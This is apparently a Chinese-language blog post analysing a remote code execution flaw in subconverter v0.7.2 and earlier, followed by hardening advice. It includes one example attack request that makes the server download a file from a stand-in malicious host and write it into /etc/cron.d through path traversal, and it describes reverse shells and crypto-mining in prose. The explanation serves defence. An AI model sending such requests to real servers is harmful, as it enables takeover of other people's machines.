---
layout: posts
title: subconverter RCE 漏洞
mathjax: true
date: 2024-10-28 11:12:12
categories: 网络安全
tags: 
  - VPN
  - 代理
---

2022 年 5 月前后，安全研究人员披露了 v0.7.2 及更早版本中存在的一个无需身份验证即可触发的 远程代码执行（RCE）漏洞。

#### 漏洞原理解析

功能机制：动态加载外部配置文件
subconverter 允许用户通过 URL 参数传入自定义的配置模板（例如 config 参数或 ruleset 参数）。
当用户请求转换订阅时，subconverter 会去下载这个指定的外部配置文件，**并将转为MD5作为文件名称保存到本地服务器磁盘上**，然后再读取解析。

漏洞产生：缺少安全过滤（Path Traversal 目录穿越）
在受影响的版本（如 v0.7.2）中，程序对传入的配置文件文件名或下载路径没有进行严格的过滤和规范化处理。
攻击者可以在请求的参数中，构造带有 ../（路径穿越/目录遍历）特性的文件名或恶意路径。

恶意覆盖：任意写文件
由于没有限制写入文件的路径和类型，攻击者可以控制 subconverter 将任意内容写入到服务器上的任意可写位置。例如：
覆盖 Linux 上的系统配置文件。
写入到系统的计划任务目录（/etc/cron.d/ 或 /var/spool/cron/crontabs/）。
如果 subconverter 部署在 Web 服务器根目录下，攻击者可以直接写入可执行的 WebShell。


#### 完整的入侵过程示例

公网批量扫描：
攻击者利用全网扫描工具（如 Shodan、FOFA）搜索暴露在公网的 subconverter 端口（默认如 25500）。

构造恶意 Payload：
攻击者搭建一个恶意 HTTP 服务，准备好一个包含反弹 Shell（Reverse Shell）或挖矿脚本命令的 Cron 定时任务文件。

发送攻击请求：
攻击者向目标 subconverter 发送精心构造的 GET/POST 请求，参数类似：
`http://<Target-IP>:25500/sub?target=clash&url=http://恶意服务器/evil.cfg&config=../../../../../../etc/cron.d/evil_job`

服务器被动下载并写入：
subconverter 接收到请求，去下载 evil.cfg，并将其强制保存至 ../../../../../../etc/cron.d/evil_job。

服务器失陷：
Linux Cron 机制触发 evil_job 中的命令，向攻击者的 C2（控制服务器）反弹 Shell，或者开始下载运行 XMRig 挖矿程序。

#### API 是如何被恶意调用的？

Subconverter 内置了一些用于获取模板或配置信息的 API 接口（如 /getprofile 或 /sub 相关的扩展接口。
问题：代码对路径参数没有做严谨的过滤（目录穿越漏洞）。
结果：攻击者可以直接调用这些 API 接口，越权读取服务器上的配置文件（pref.ini 等）。不仅能看到服务器是否开启了缓存（aCache），甚至还能直接获取到管理员设置的 token。

Subconverter 提供了转换与缓存功能。当你请求转换一个链接时，后端 API 会把下载到的内容保存在服务器本地的缓存目录（cache）中，并以链接的 MD5 散列值作为文件名。
问题：API 允许传入任意远程 URL 参数。
利用：攻击者构造一个指向自己恶意服务器的 URL（里面包含反弹 Shell 的 Bash 脚本），调用 Subconverter 的转换 API。Subconverter 会“听话”地把这段恶意脚本下载下来，并当作缓存文件保存在服务器磁盘上。

Subconverter 内部有一个用于动态解析/运行脚本的 API 接口。
问题：如果服务器没有开启认证（api_mode=false），或者 Token 使用了默认弱口令（如 password）/ 已经在第一步被泄漏，任何人都可以免鉴权或使用泄漏的 Token 调用该 API。
利用：攻击者调用该 API，传入第二步中生成的 MD5 缓存文件名，指示后端“去执行这个缓存文件里的脚本”。服务器收到 API 命令后，立刻在后台执行了 Bash 脚本，向攻击者的 VPS 发起反弹连接 。

#### 解决办法

禁用缓存在 `pref.ini` 配置文件中设置：

```
enable_cache = false
```

必须开启 api_mode 并设置“强 Token”

```
api_mode = true
api_access_token = 你的超长复杂密码（千万不要用默认的 password）
```

在 Nginx 配置中，拦截或禁止公网访问用于读取配置和脚本调用的接口：
拦截 /convert?url=... 这种带敏感参数的请求。
封禁 /qx-script 等历史高危接口。
只向公网暴露常规的 /sub 订阅转换主接口。

容器隔离与非 Root 运行
使用 Docker 部署：并将容器根目录挂载为只读（Read-Only）。
禁止 Root 权限：即使黑客真的找到未知的 Day 漏洞拿到了权限，他也只是被困在一个没有写入权限、非 Root 用户的 Docker 容器内部，无法触及你的真实宿主机和网段。